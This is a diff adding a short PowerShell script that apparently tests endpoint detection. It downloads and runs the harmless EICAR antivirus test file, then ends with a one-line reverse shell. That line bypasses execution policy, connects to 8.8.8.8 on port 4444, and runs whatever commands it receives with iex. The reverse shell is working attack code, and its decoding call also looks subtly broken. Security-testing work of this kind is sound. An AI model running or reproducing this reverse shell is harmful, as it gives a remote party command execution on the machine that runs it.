@@ -1,0 +1,18 @@
+# Download the EICAR Test File
+$url = "https://www.eicar.org/download/eicar-com-2/?wpdmdl=8842&refresh=6797f5143f3d81738011924"
+$outputPath = "$env:USERPROFILE\Downloads\eicar-test-file.com"
+
+Invoke-WebRequest -Uri $url -OutFile $outputPath
+
+# Check if the File Exists
+if (Test-Path -Path $outputPath) {
+    Write-Host "The EICAR test file exists at: $outputPath" -ForegroundColor Green
+} else {
+    Write-Host "The EICAR test file does NOT exist at: $outputPath" -ForegroundColor Red
+}
+
+#Execute the EICAR Test File
+Start-Process -FilePath $outputPath
+
+# PowerShell Reverse Shell Command
+powershell -ExecutionPolicy Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient('8.8.8.8', 4444); $stream = $client.GetStream(); [byte[]]$buffer = 0..65535|%{0}; while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) { $data = (New-Object Text.Encoding).GetString($buffer,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush(); }"
